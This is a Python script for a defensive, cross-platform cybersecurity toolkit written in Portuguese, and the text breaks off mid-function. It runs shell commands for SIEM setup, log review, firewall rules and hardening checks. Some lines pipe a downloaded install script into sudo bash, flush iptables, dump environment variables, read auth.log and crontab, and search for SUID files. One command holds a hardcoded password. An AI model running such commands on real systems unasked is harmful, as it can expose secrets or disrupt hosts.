#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║          AOFR TECH · CYBERSECURITY TOOLKIT · ANGOLA 2025                    ║
# ║          Atitude · Orientação · Força · Resultado                           ║
# ║          Autor: Alfredo Ociola Francisco Romano                             ║
# ║          Versão: 2.0 · Universal (Windows CMD/PowerShell · Linux · macOS)  ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

import subprocess
import sys
import os
import time
import datetime
import shutil
import platform
import ctypes
import tempfile
from typing import Optional

# ─────────────────────────────────────────────
#  DETECÇÃO DE PLATAFORMA
# ─────────────────────────────────────────────
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX   = platform.system() == "Linux"
IS_MACOS   = platform.system() == "Darwin"
IS_POSIX   = os.name == "posix"

# ─────────────────────────────────────────────
#  SUPORTE A CORES ANSI (Windows 10+)
# ─────────────────────────────────────────────
def _enable_ansi_windows() -> bool:
    """Activa o suporte a ANSI no terminal Windows (CMD/PowerShell)."""
    if not IS_WINDOWS:
        return True
    try:
        kernel32 = ctypes.windll.kernel32
        # Obter handle do stdout
        handle = kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
        # Obter modo actual
        mode = ctypes.c_ulong()
        if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            return False
        # Activar ENABLE_VIRTUAL_TERMINAL_PROCESSING (0x0004)
        ENABLE_VT = 0x0004
        if not (mode.value & ENABLE_VT):
            kernel32.SetConsoleMode(handle, mode.value | ENABLE_VT)
        return True
    except Exception:
        return False

ANSI_SUPPORTED = _enable_ansi_windows()

# ─────────────────────────────────────────────
#  CORES ANSI
# ─────────────────────────────────────────────
class C:
    if ANSI_SUPPORTED:
        RESET   = "\033[0m"
        BOLD    = "\033[1m"
        DIM     = "\033[2m"
        CYAN    = "\033[96m"
        ORANGE  = "\033[38;5;214m"
        GREEN   = "\033[92m"
        PURPLE  = "\033[95m"
        RED     = "\033[91m"
        YELLOW  = "\033[93m"
        PINK    = "\033[38;5;213m"
        WHITE   = "\033[97m"
        BG_DARK = "\033[48;5;233m"
        LINE    = "\033[38;5;238m"
    else:
        # Sem cores em terminais antigos
        RESET = BOLD = DIM = CYAN = ORANGE = GREEN = PURPLE = ""
        RED = YELLOW = PINK = WHITE = BG_DARK = LINE = ""

AREA_COLORS = {
    1: C.CYAN,
    2: C.ORANGE,
    3: C.GREEN,
    4: C.PURPLE,
    5: C.RED,
    6: C.YELLOW,
    7: C.PINK,
    9: C.ORANGE,
}

# ─────────────────────────────────────────────
#  UTILITÁRIOS DO SISTEMA OPERATIVO
# ─────────────────────────────────────────────
def get_temp_dir() -> str:
    """Retorna directório temporário compatível com todos os SO."""
    return tempfile.gettempdir()

def normalize_path(path: str) -> str:
    """Normaliza separadores de path para o SO actual."""
    return os.path.normpath(path)

def make_dir(path: str) -> str:
    """Cria directório de forma cross-platform."""
    os.makedirs(path, exist_ok=True)
    return path

def path_join(*args) -> str:
    """Junta paths de forma cross-platform."""
    return os.path.join(*args)

# Directório temporário do toolkit
TOOLKIT_TMP = path_join(get_temp_dir(), "aofr_toolkit")

def get_ir_dir() -> str:
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    return path_join(get_temp_dir(), f"ir_aofr_{ts}")

# ─────────────────────────────────────────────
#  MAPEAMENTO DE COMANDOS CROSS-PLATFORM
# ─────────────────────────────────────────────
# Comandos que diferem entre Windows e Unix
CMD_MAP = {
    # (linux_cmd, windows_cmd)
    "clear_screen": ("clear", "cls"),
    "list_dir":     ("ls -la", "dir"),
    "who":          ("who", "query user"),
    "whoami":       ("whoami", "whoami"),
    "ifconfig":     ("ip addr show 2>/dev/null || ifconfig", "ipconfig /all"),
    "netstat":      ("ss -tulpn 2>/dev/null || netstat -tulpn", "netstat -ano"),
    "ps":           ("ps auxf", "tasklist /v"),
    "hostname":     ("hostname", "hostname"),
    "uname":        ("uname -a", "systeminfo | findstr /B /C:\"OS\""),
    "cat":          ("cat", "type"),
    "mkdir":        ("mkdir -p", "mkdir"),
    "rm":           ("rm -rf", "rmdir /s /q"),
    "copy":         ("cp", "copy"),
    "move":         ("mv", "move"),
    "find_files":   ("find", "where"),
    "hash_sha256":  ("sha256sum", "certutil -hashfile"),
    "hash_md5":     ("md5sum", "certutil -hashfile"),
    "curl":         ("curl", "curl"),       # curl disponível no Windows 10+
    "wget":         ("wget", "curl -O"),    # wget → curl no Windows
    "tar":          ("tar czf", "tar czf"), # tar nativo no Windows 10+
    "ping":         ("ping -c 4", "ping -n 4"),
    "traceroute":   ("traceroute", "tracert"),
    "nslookup":     ("nslookup", "nslookup"),
    "arp":          ("arp -a", "arp -a"),
    "sudo":         ("sudo ", ""),          # sudo não existe no Windows
    "apt_install":  ("sudo apt install -y", "choco install -y"),  # chocolatey
    "pip":          ("pip3", "pip"),
    "python":       ("python3", "python"),
    "service_status": ("systemctl status", "sc query"),
    "service_start":  ("sudo systemctl start", "net start"),
    "service_stop":   ("sudo systemctl stop", "net stop"),
    "env":          ("env", "set"),
    "echo_null":    ("2>/dev/null", "2>nul"),
    "dev_null":     ("/dev/null", "nul"),
    "path_sep":     ("/", "\\"),
}

def cmd(key: str) -> str:
    """Retorna o comando correcto para o SO actual."""
    linux_cmd, win_cmd = CMD_MAP.get(key, (key, key))
    return win_cmd if IS_WINDOWS else linux_cmd

def suppress_errors() -> str:
    """Retorna redireccionar de erros para null no SO actual."""
    return "2>nul" if IS_WINDOWS else "2>/dev/null"

def null_device() -> str:
    """Retorna dispositivo nulo do SO actual."""
    return "nul" if IS_WINDOWS else "/dev/null"

def sudo(command: str) -> str:
    """Adiciona sudo no Linux/macOS; no Windows não é necessário (requer Admin)."""
    if IS_WINDOWS:
        return command  # No Windows, executa directamente (requer privilégios Admin)
    return f"sudo {command}"

def apt_or_choco(package: str, choco_package: str = "") -> str:
    """Retorna comando de instalação correcto para o SO."""
    pkg = choco_package if choco_package else package
    if IS_WINDOWS:
        return f"choco install {pkg} -y {suppress_errors()}"
    return f"sudo apt install {package} -y {suppress_errors()}"

# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
def banner():
    os.system(cmd("clear_screen")[1] if IS_WINDOWS else "clear")
    w = shutil.get_terminal_size((100, 30)).columns
    print(C.CYAN + "═" * w + C.RESET)
    print(C.BOLD + C.CYAN + r"""
   █████╗  ██████╗ ███████╗██████╗     ████████╗███████╗ ██████╗██╗  ██╗
  ██╔══██╗██╔═══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔════╝██║  ██║
  ███████║██║   ██║█████╗  ██████╔╝       ██║   █████╗  ██║     ███████║
  ██╔══██║██║   ██║██╔══╝  ██╔══██╗       ██║   ██╔══╝  ██║     ██╔══██║
  ██║  ██║╚██████╔╝██║     ██║  ██║       ██║   ███████╗╚██████╗██║  ██║
  ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝       ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
""" + C.RESET)
    plat_label = f"Windows {platform.release()}" if IS_WINDOWS else f"{platform.system()} {platform.release()}"
    print(C.ORANGE + C.BOLD + "  ⬡  Atitude · Orientação · Força · Resultado  ⬡".center(w) + C.RESET)
    print(C.DIM + f"  Alfredo Ociola Francisco Romano · CyberKit · Angola 2025 · {plat_label}".center(w) + C.RESET)
    print(C.CYAN + "═" * w + C.RESET)
    print()

# ─────────────────────────────────────────────
#  UTILITÁRIOS DE UI
# ─────────────────────────────────────────────
def section_header(num: int, title: str, subtitle: str):
    color = AREA_COLORS.get(num, C.CYAN)
    w = shutil.get_terminal_size((100, 30)).columns
    print()
    print(color + "▓" * w + C.RESET)
    print(color + C.BOLD + f"  ÁREA {num:02d}  ·  {title}" + C.RESET)
    print(C.DIM + f"  {subtitle}" + C.RESET)
    print(color + "▓" * w + C.RESET)

def subsection(title: str, area: int = 1):
    color = AREA_COLORS.get(area, C.CYAN)
    print()
    print(color + f"  ┌─ {title} " + "─" * max(0, 60 - len(title)) + "┐" + C.RESET)

def cmd_info(desc: str):
    print(C.DIM + f"  │  ℹ  {desc}" + C.RESET)

def print_cmd(c: str):
    prompt = "PS>" if IS_WINDOWS else "$"
    print(C.DIM + "  │  " + C.RESET + C.WHITE + f"{prompt} " + C.GREEN + c + C.RESET)

def success(msg: str):
    print(C.GREEN + f"  │  ✔  {msg}" + C.RESET)

def warn(msg: str):
    print(C.YELLOW + f"  │  ⚠  {msg}" + C.RESET)

def error(msg: str):
    print(C.RED + f"  │  ✘  {msg}" + C.RESET)

def info(msg: str):
    print(C.CYAN + f"  │  ►  {msg}" + C.RESET)

def divider(area: int = 1):
    color = AREA_COLORS.get(area, C.CYAN)
    print(color + "  └" + "─" * 68 + "┘" + C.RESET)

def scenario_header(title: str):
    w = shutil.get_terminal_size((100, 30)).columns
    print()
    print(C.GREEN + "  ╔" + "═" * (w - 4) + "╗" + C.RESET)
    print(C.GREEN + C.BOLD + f"  ║  ⬡ CENÁRIO REAL · {title}".ljust(w - 2) + "║" + C.RESET)
    print(C.GREEN + "  ╚" + "═" * (w - 4) + "╝" + C.RESET)

def pause_menu():
    print()
    print(C.DIM + "  Pressione " + C.CYAN + "ENTER" + C.DIM + " para continuar ou " +
          C.ORANGE + "q+ENTER" + C.DIM + " para voltar ao menu..." + C.RESET)
    r = input("  > ").strip().lower()
    return r != "q"

def platform_info():
    """Mostra informação da plataforma activa."""
    if IS_WINDOWS:
        info(f"Plataforma: Windows {platform.release()} ({platform.machine()})")
        info("Dica: Execute como Administrador para comandos privilegiados")
    elif IS_LINUX:
        info(f"Plataforma: Linux {platform.release()}")
    elif IS_MACOS:
        info(f"Plataforma: macOS {platform.mac_ver()[0]}")

# ─────────────────────────────────────────────
#  EXECUTOR DE COMANDOS UNIVERSAL
# ─────────────────────────────────────────────
def run(cmd_str: str, dry: bool = False, timeout: int = 30,
        capture: bool = False, shell: bool = True) -> Optional[str]:
    """
    Executa um comando shell de forma cross-platform.
    dry=True  → apenas exibe (modo seguro para comandos destrutivos).
    capture=True → retorna stdout como string.

    No Windows: usa cmd.exe via shell=True.
    No Linux/macOS: usa /bin/sh via shell=True.
    """
    print_cmd(cmd_str)
    if dry:
        warn("Modo DRY-RUN · Comando não executado (requer autorização / ambiente específico)")
        return None
    try:
        # No Windows, garantir que o encoding é correcto
        env = os.environ.copy()
        if IS_WINDOWS:
            env["PYTHONIOENCODING"] = "utf-8"

        result = subprocess.run(
            cmd_str,
            shell=True,
            text=True,
            capture_output=capture,
            timeout=timeout,
            env=env,
            encoding="utf-8",
            errors="replace"
        )
        if capture:
            return result.stdout.strip()
        if result.returncode == 0:
            success(f"Concluído (exit {result.returncode})")
        else:
            warn(f"Exit code {result.returncode}")
        return None
    except subprocess.TimeoutExpired:
        warn(f"Timeout após {timeout}s")
    except FileNotFoundError as e:
        error(f"Ferramenta não encontrada: {e}")
    except Exception as e:
        error(f"Erro: {e}")
    return None

def check_tool(name: str) -> bool:
    """Verifica se uma ferramenta está disponível no PATH."""
    # No Windows, também testar com extensão .exe
    if IS_WINDOWS:
        return shutil.which(name) is not None or shutil.which(f"{name}.exe") is not None
    return shutil.which(name) is not None

def run_python(code: str, dry: bool = False) -> Optional[str]:
    """Executa código Python inline de forma cross-platform."""
    python_exe = "python" if IS_WINDOWS else "python3"
    return run(f'{python_exe} -c "{code}"', dry=dry, capture=True)

# ─────────────────────────────────────────────
#  COMANDOS CROSS-PLATFORM ESPECÍFICOS
# ─────────────────────────────────────────────
def hash_file(filepath: str) -> str:
    """Gera comando de hash SHA-256 cross-platform."""
    if IS_WINDOWS:
        return f'certutil -hashfile "{filepath}" SHA256'
    return f"sha256sum {filepath}"

def md5_file(filepath: str) -> str:
    """Gera comando de hash MD5 cross-platform."""
    if IS_WINDOWS:
        return f'certutil -hashfile "{filepath}" MD5'
    return f"md5sum {filepath}"

def list_processes() -> str:
    """Lista processos em execução."""
    if IS_WINDOWS:
        return "tasklist /v"
    return f"ps auxf {suppress_errors()}"

def list_connections() -> str:
    """Lista conexões de rede activas."""
    if IS_WINDOWS:
        return "netstat -ano"
    return f"ss -tulpn {suppress_errors()} || netstat -tulpn {suppress_errors()}"

def list_open_files() -> str:
    """Lista ficheiros abertos (lsof equivalente)."""
    if IS_WINDOWS:
        return "handle.exe -a 2>nul || echo handle.exe nao disponivel (Sysinternals)"
    return f"lsof -n {suppress_errors()}"

def get_ip_info() -> str:
    """Informação de interfaces de rede."""
    if IS_WINDOWS:
        return "ipconfig /all"
    return f"ip addr show {suppress_errors()} || ifconfig {suppress_errors()}"

def get_routing_table() -> str:
    """Tabela de rotas."""
    if IS_WINDOWS:
        return "route print"
    return f"ip route show {suppress_errors()} || netstat -rn {suppress_errors()}"

def get_logged_users() -> str:
    """Utilizadores com sessão activa."""
    if IS_WINDOWS:
        return "query user 2>nul || quser 2>nul"
    return f"who {suppress_errors()} && w {suppress_errors()}"

def get_env_vars() -> str:
    """Variáveis de ambiente."""
    return "set" if IS_WINDOWS else "env"

def get_kernel_info() -> str:
    """Informação do kernel/OS."""
    if IS_WINDOWS:
        return 'systeminfo | findstr /B /C:"OS" /C:"System" /C:"Processor"'
    return "uname -a"

def find_files_modified(directory: str, hours: int = 24) -> str:
    """Ficheiros modificados nas últimas N horas."""
    if IS_WINDOWS:
        # PowerShell para find equivalente no Windows
        mins = hours * 60
        return (f'powershell -Command "Get-ChildItem -Path \'{directory}\' '
                f'-Recurse -ErrorAction SilentlyContinue | '
                f'Where-Object {{$_.LastWriteTime -gt (Get-Date).AddMinutes(-{mins})}} | '
                f'Select-Object FullName | Select-Object -First 20"')
    return f"find {directory} -mtime -1 -type f {suppress_errors()} | head -20"

def find_suid_files() -> str:
    """Ficheiros SUID (Linux) / executáveis com permissões elevadas (Windows)."""
    if IS_WINDOWS:
        return 'powershell -Command "Get-ChildItem C:\\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Extension -eq \'.exe\'} | Select-Object -First 20 FullName"'
    return f"find / -perm /4000 -type f {suppress_errors()} | grep -v '/usr/bin\\|/usr/sbin\\|/bin\\|/sbin' | head -20"

def get_cron_tasks() -> str:
    """Tarefas agendadas (cron Linux / Task Scheduler Windows)."""
    if IS_WINDOWS:
        return "schtasks /query /fo LIST /v 2>nul | findstr /B \"TaskName Status\" | head"
    return f"cat /etc/crontab {suppress_errors()} && ls /etc/cron.*/ {suppress_errors()}"

def get_failed_services() -> str:
    """Serviços com falha."""
    if IS_WINDOWS:
        return "sc query type= all state= inactive 2>nul | findstr SERVICE_NAME"
    return f"systemctl list-units --state=failed {suppress_errors()} | head -20"

def get_ssh_logs() -> str:
    """Logs de SSH (últimas 24h)."""
    if IS_WINDOWS:
        return 'powershell -Command "Get-EventLog -LogName Security -Newest 50 -InstanceId 4624,4625 -ErrorAction SilentlyContinue | Format-List TimeGenerated,Message"'
    return f"sudo journalctl --since '24 hours ago' -u ssh --no-pager {suppress_errors()} | tail -30 || echo 'SSH service not found'"

def get_open_ports() -> str:
    """Portas abertas localmente."""
    if IS_WINDOWS:
        return "netstat -ano | findstr LISTENING"
    return f"sudo ss -tulpn {suppress_errors()} | grep LISTEN || netstat -tulpn {suppress_errors()} | grep LISTEN"

def isolate_network_dry() -> list:
    """Comandos para isolar sistema da rede (DRY RUN)."""
    if IS_WINDOWS:
        return [
            "netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound",
            "netsh advfirewall firewall add rule name=\"IR-Allow-Admin\" dir=in action=allow remoteip=10.10.10.5 protocol=TCP localport=3389",
        ]
    return [
        "sudo iptables -F && sudo iptables -P INPUT DROP && sudo iptables -P OUTPUT DROP",
        "sudo iptables -A INPUT -s 10.10.10.5 -p tcp --dport 22 -j ACCEPT",
        "sudo iptables -A OUTPUT -d 10.10.10.5 -p tcp --sport 22 -j ACCEPT",
        "sudo ip route del default",
    ]

def block_malicious_domain(domain: str) -> str:
    """Bloqueia domínio via hosts file."""
    if IS_WINDOWS:
        hosts = r"C:\Windows\System32\drivers\etc\hosts"
        return f'echo 0.0.0.0 {domain} >> "{hosts}"'
    return f"echo '0.0.0.0 {domain}' | sudo tee -a /etc/hosts"

def disable_user(username: str) -> list:
    """Desactiva conta de utilizador comprometida."""
    if IS_WINDOWS:
        return [
            f"net user {username} /active:no",
            f"query session {username} 2>nul",
        ]
    return [
        f"sudo usermod -L {username} {suppress_errors()}",
        f"sudo pkill -u {username} {suppress_errors()}",
    ]

def archive_evidence(source_dir: str, archive_path: str) -> str:
    """Compacta artefactos de evidência."""
    if IS_WINDOWS:
        return f'tar czf "{archive_path}" "{source_dir}" 2>nul'
    return f"tar czf {archive_path} {source_dir} {suppress_errors()}"

def collect_ir_artifacts(ir_dir: str) -> list:
    """Lista de comandos para colecta de artefactos IR cross-platform."""
    p = lambda f: path_join(ir_dir, f)
    if IS_WINDOWS:
        return [
            (f'tasklist /v > "{p("ir_processos.txt")}"',        "Processos em execução"),
            (f'netstat -ano > "{p("ir_conexoes.txt")}"',         "Conexões de rede"),
            (f'query user > "{p("ir_utilizadores.txt")}" 2>nul', "Utilizadores activos"),
            (f'set > "{p("ir_env.txt")}"',                        "Variáveis de ambiente"),
            (f'systeminfo > "{p("ir_sysinfo.txt")}"',            "Informação do sistema"),
            (f'ipconfig /all > "{p("ir_network.txt")}"',         "Interfaces de rede"),
            (f'schtasks /query /fo LIST /v > "{p("ir_tasks.txt")}" 2>nul', "Tarefas agendadas"),
            (f'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run > "{p("ir_autorun.txt")}" 2>nul', "Chaves Run (persistência)"),
            (f'wmic startup list full > "{p("ir_startup.txt")}" 2>nul', "Programas de arranque"),
        ]
    else:
        return [
            (f"ps auxf > {p('ir_processos.txt')} {suppress_errors()}", "Processos em execução"),
            (f"pstree -p > {p('ir_pstree.txt')} {suppress_errors()}", "Árvore de processos"),
            (f"ss -tulpn > {p('ir_conexoes.txt')} {suppress_errors()}", "Conexões de rede"),
            (f"netstat -anp > {p('ir_netstat.txt')} {suppress_errors()} || ss -anp > {p('ir_netstat.txt')} {suppress_errors()}", "Estado da rede"),
            (f"who > {p('ir_utilizadores.txt')} {suppress_errors()}", "Utilizadores activos"),
            (f"w > {p('ir_who.txt')} {suppress_errors()}", "Sessões activas"),
            (f"last -n 50 > {p('ir_logins.txt')} {suppress_errors()}", "Histórico de logins"),
            (f"lsof -n > {p('ir_lsof.txt')} {suppress_errors()}", "Ficheiros abertos"),
            (f"lsmod > {p('ir_modulos.txt')} {suppress_errors()}", "Módulos do kernel"),
            (f"env > {p('ir_env.txt')} {suppress_errors()}", "Variáveis de ambiente"),
        ]

# ─────────────────────────────────────────────
#  ÁREA 01 · ANALISTA DE SEGURANÇA
# ─────────────────────────────────────────────
def area_01():
    section_header(1, "ANALISTA DE SEGURANÇA", "Blue Team · SIEM · Monitoramento · Threat Intelligence")
    platform_info()

    # 1.1 Wazuh SIEM
    subsection("1.1 · WAZUH SIEM — Instalação e Gestão", 1)
    cmd_info("Instalar Wazuh All-in-One (Manager + Dashboard)")
    if IS_WINDOWS:
        warn("Wazuh Manager não suporta Windows nativamente. Use WSL2 ou Docker.")
        run('docker run -d --name wazuh-manager -p 1514:1514 -p 1515:1515 wazuh/wazuh-manager:latest 2>nul', dry=True)
    else:
        run("curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh", dry=True)
        run("sudo bash wazuh-install.sh -a", dry=True)
    cmd_info("Verificar status dos serviços")
    if IS_WINDOWS:
        run("sc query WazuhSvc 2>nul || echo Wazuh nao instalado como servico Windows")
    else:
        run(f"sudo systemctl status wazuh-manager --no-pager {suppress_errors()} || echo 'wazuh-manager não instalado'")
        run(f"sudo systemctl status wazuh-dashboard --no-pager {suppress_errors()} || echo 'wazuh-dashboard não instalado'")
    cmd_info("Verificar agentes conectados")
    if IS_WINDOWS:
        run(r'"C:\Program Files (x86)\ossec-agent\agent-control.exe" -l 2>nul || echo Wazuh Agent nao instalado')
    else:
        run(f"sudo /var/ossec/bin/agent_control -l {suppress_errors()} || echo 'Wazuh não instalado neste sistema'")
    divider(1)

    # 1.2 Elastic SIEM
    subsection("1.2 · ELASTIC SIEM (ELK) — Docker Deploy", 1)
    cmd_info("Verificar se Docker está disponível")
    if check_tool("docker"):
        run("docker ps --format \"table {{.Names}}\\t{{.Status}}\" 2>nul | head -10")
        cmd_info("Pull e iniciar Elasticsearch + Kibana")
        run('docker pull docker.elastic.co/elasticsearch/elasticsearch:8.12.0', dry=True)
        run('docker run -d --name elasticsearch -e "discovery.type=single-node" -e "ELASTIC_PASSWORD=Angola@2025" -p 9200:9200 elasticsearch:8.12.0', dry=True)
        run('docker run -d --name kibana -e "ELASTICSEARCH_HOSTS=http://elasticsearch:9200" --link elasticsearch -p 5601:5601 kibana:8.12.0', dry=True)
    else:
        if IS_WINDOWS:
            warn("Docker não encontrado. Instale Docker Desktop: https://docs.docker.com/desktop/install/windows-install/")
        else:
            warn("Docker não encontrado. Instale com: sudo apt install docker.io -y")
    divider(1)

    # 1.3 Análise de Logs
    subsection("1.3 · ANÁLISE DE LOGS EM TEMPO REAL", 1)
    cmd_info("Últimas entradas do log do sistema")
    if IS_WINDOWS:
        run('powershell -Command "Get-EventLog -LogName System -Newest 20 -ErrorAction SilentlyContinue | Format-List TimeGenerated,EntryType,Message"')
    else:
        run(f"sudo tail -20 /var/log/syslog {suppress_errors()} || sudo journalctl -n 20 --no-pager {suppress_errors()} || echo 'Log não disponível'")
    cmd_info("Tentativas de login falhadas")
    if IS_WINDOWS:
        run('powershell -Command "Get-EventLog -LogName Security -InstanceId 4625 -Newest 20 -ErrorAction SilentlyContinue | Select-Object TimeGenerated,Message | Format-List"')
    else:
        run(f"grep 'Failed password' /var/log/auth.log {suppress_errors()} | awk '{{print $11}}' | sort | uniq -c | sort -rn | head -20 || echo 'auth.log não disponível'")
    cmd_info("Logins bem-sucedidos")
    if IS_WINDOWS:
        run('powershell -Command "Get-EventLog -LogName Security -InstanceId 4624 -Newest 20 -ErrorAction SilentlyContinue | Select-Object TimeGenerated,Message | Format-List"')
    else:
        run(f"grep 'Accepted password\\|Accepted publickey' /var/log/auth.log {suppress_errors()} | tail -20 || echo 'Sem registos'")
    divider(1)

    # 1.4 Threat Intelligence
    subsection("1.4 · THREAT INTELLIGENCE — Verificação de IOCs", 1)
    IP_SUSPEITO = "185.220.101.45"
    cmd_info(f"Verificar IP suspeito: {IP_SUSPEITO} via VirusTotal API")
    run(f'curl -s "https://www.virustotal.com/api/v3/ip_addresses/{IP_SUSPEITO}" -H "x-apikey: SEU_API_KEY_VIRUSTOTAL"', dry=True)
    cmd_info("Calcular hash de ficheiro suspeito")
    if IS_WINDOWS:
        run(f'certutil -hashfile "%SystemRoot%\\System32\\calc.exe" SHA256 2>nul')
    else:
        run(f"sha256sum /bin/ls {suppress_errors()} | head -1")
    cmd_info("Bloquear IP malicioso via Firewall")
    if IS_WINDOWS:
        run(f'netsh advfirewall firewall add rule name="BLOCK_{IP_SUSPEITO}" dir=in action=block remoteip={IP_SUSPEITO}', dry=True)
        run(f'netsh advfirewall firewall add rule name="BLOCK_{IP_SUSPEITO}_OUT" dir=out action=block remoteip={IP_SUSPEITO}', dry=True)
    else:
        run(f"sudo iptables -I INPUT -s {IP_SUSPEITO} -j DROP", dry=True)
        run(f"sudo iptables -I OUTPUT -d {IP_SUSPEITO} -j DROP", dry=True)
        run(f"sudo iptables-save | sudo tee /etc/iptables/rules.v4", dry=True)
    divider(1)

    # 1.5 Correlação de Eventos SIEM
    subsection("1.5 · CORRELAÇÃO DE EVENTOS — Regras Wazuh/SIEM", 1)
    cmd_info("Criar regra de alerta Wazuh para brute force SSH")
    RULE_CONTENT = '''<rule id="100001" level="10" frequency="5" timeframe="60">
  <if_matched_sid>5760</if_matched_sid>
  <same_source_ip />
  <description>Brute Force SSH detectado - Angola SOC</description>
  <group>authentication_failures,pci_dss_10.2.4</group>
</rule>'''
    info(f"Conteúdo da regra:\n{RULE_CONTENT}")
    divider(1)

    # 1.6 OpenVAS / Nmap
    subsection("1.6 · NMAP — Gestão de Vulnerabilidades", 1)
    TARGET = "127.0.0.1"
    if check_tool("nmap"):
        run(f"nmap -sV --script=default,safe {TARGET} -oN \"{path_join(get_temp_dir(), 'scan_aofr.txt')}\" {suppress_errors()} | head -30")
    else:
        if IS_WINDOWS:
            warn("nmap não encontrado. Instale em: https://nmap.org/download.html ou choco install nmap")
        else:
            warn("nmap não encontrado. Execute: sudo apt install nmap -y")

    # Cenário Real
    scenario_header("LOGIN SUSPEITO — BANCO ANGOLANO")
    cmd_info("PASSO 1 · Verificar histórico de logins suspeitos")
    if IS_WINDOWS:
        run('powershell -Command "Get-EventLog -LogName Security -InstanceId 4625 -Newest 10 -ErrorAction SilentlyContinue | Format-List"')
    else:
        run(f"grep 'Failed password' /var/log/auth.log {suppress_errors()} | tail -10 || echo 'Sem registos'")
    cmd_info("PASSO 2 · Bloqueio imediato do IP suspeito")
    if IS_WINDOWS:
        run('netsh advfirewall firewall add rule name="BLOCK_SUSPECT" dir=in action=block remoteip=91.108.4.0/24', dry=True)
    else:
        run("sudo iptables -I INPUT -s 91.108.4.0 -j DROP", dry=True)
        run("sudo iptables -I INPUT -s 91.108.4.0/24 -j DROP", dry=True)
    cmd_info("PASSO 3 · Reset de password")
    if IS_WINDOWS:
        run("net user director_financeiro * /domain", dry=True)
    else:
        run("sudo passwd -l director_financeiro", dry=True)
    divider(1)
    pause_menu()

# ─────────────────────────────────────────────
#  ÁREA 02 · ENGENHEIRO DE SEGURANÇA
# ─────────────────────────────────────────────
def area_02():
    section_header(2, "ENGENHEIRO DE SEGURANÇA", "Arquitectura · Firewall · VPN · DevSecOps · Hardening")
    platform_info()

    # 2.1 Firewall
    subsection("2.1 · FIREWALL — Configuração Profissional", 2)
    cmd_info("Política base restritiva")
    if IS_WINDOWS:
        run('netsh advfirewall set allprofiles firewallpolicy blockinbound,allowoutbound', dry=True)
        run('netsh advfirewall set allprofiles state on', dry=True)
        cmd_info("Permitir SSH/RDP apenas da rede interna")
        run('netsh advfirewall firewall add rule name="Allow-RDP-Internal" dir=in action=allow remoteip=192.168.10.0/24 protocol=TCP localport=3389', dry=True)
        cmd_info("Permitir HTTP/HTTPS")
        run('netsh advfirewall firewall add rule name="Allow-HTTP" dir=in action=allow protocol=TCP localport=80', dry=True)
        run('netsh advfirewall firewall add rule name="Allow-HTTPS" dir=in action=allow protocol=TCP localport=443', dry=True)
        cmd_info("Listar regras de firewall activas")
        run('netsh advfirewall firewall show rule name=all status=enabled 2>nul | head -30')
    else:
        run("sudo iptables -F", dry=True)
        run("sudo iptables -P INPUT DROP", dry=True)
        run("sudo iptables -P FORWARD DROP", dry=True)
        run("sudo iptables -P OUTPUT ACCEPT", dry=True)
        run("sudo iptables -A INPUT -i lo -j ACCEPT", dry=True)
        run("sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT", dry=True)
        run("sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.10.0/24 -j ACCEPT", dry=True)
        run("sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT", dry=True)
        run("sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT", dry=True)
        run(f"sudo iptables -L -n -v --line-numbers {suppress_errors()} || echo 'Sem permissão sudo'")
    divider(2)

    # 2.2 Hardening
    subsection("2.2 · HARDENING — Verificações de Segurança", 2)
    cmd_info("Informação do sistema operativo")
    run(get_kernel_info())
    cmd_info("Portas abertas (superfície de ataque)")
    run(get_open_ports())
    cmd_info("Serviços em execução")
    if IS_WINDOWS:
        run('sc query type= all state= running 2>nul | findstr SERVICE_NAME | head')
        cmd_info("Verificar conta Administrator activa")
        run('net user administrator 2>nul | findstr "Account active"')
        cmd_info("Verificar política de passwords")
        run('net accounts 2>nul')
        cmd_info("Verificar RDP habilitado")
        run('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections 2>nul')
    else:
        run(f"sudo lynis audit system --quick {suppress_errors()} | tail -20 || echo 'Lynis não instalado'")
        run(f"cat /etc/ssh/sshd_config {suppress_errors()} | grep -E 'Protocol|PermitRootLogin|MaxAuthTries|PasswordAuthentication' || echo 'sshd_config não disponível'")
        run(f"sysctl net.ipv4.ip_forward net.ipv4.tcp_syncookies kernel.randomize_va_space {suppress_errors()}")
    divider(2)

    # 2.3 VPN
    subsection("2.3 · VPN — Configuração WireGuard/OpenVPN", 2)
    if IS_WINDOWS:
        cmd_info("WireGuard para Windows")
        run("winget install -e --id WireGuard.WireGuard 2>nul", dry=True)
        cmd_info("Alternativa: OpenVPN Community")
        run("winget install -e --id OpenVPNTechnologies.OpenVPN 2>nul", dry=True)
        cmd_info("Verificar adaptadores VPN activos")
        run(r'ipconfig /all | findstr "VPN"')
    else:
        run("sudo apt install wireguard -y {suppress_errors()}", dry=True)
        run("wg genkey | sudo tee /etc/wireguard/server_private.key | wg pubkey | sudo tee /etc/wireguard/server_public.key", dry=True)
        run(f"sudo wg show {suppress_errors()} || echo 'WireGuard não activo'")
    divider(2)

    # 2.4 DevSecOps
    subsection("2.4 · DEVSECOPS — Pipeline CI/CD Seguro", 2)
    cmd_info("SAST — Semgrep: análise estática de código")
    if check_tool("semgrep"):
        tmp = get_temp_dir()
        run(f'semgrep --config auto "{tmp}" --json {suppress_errors()} | head -30')
    else:
        warn(f"Semgrep não instalado. Execute: {'pip install semgrep' if IS_WINDOWS else 'pip3 install semgrep'}")
    cmd_info("Container scan — Trivy")
    if check_tool("trivy"):
        run(f"trivy image --severity CRITICAL,HIGH nginx:latest {suppress_errors()} | head -30")
    else:
        if IS_WINDOWS:
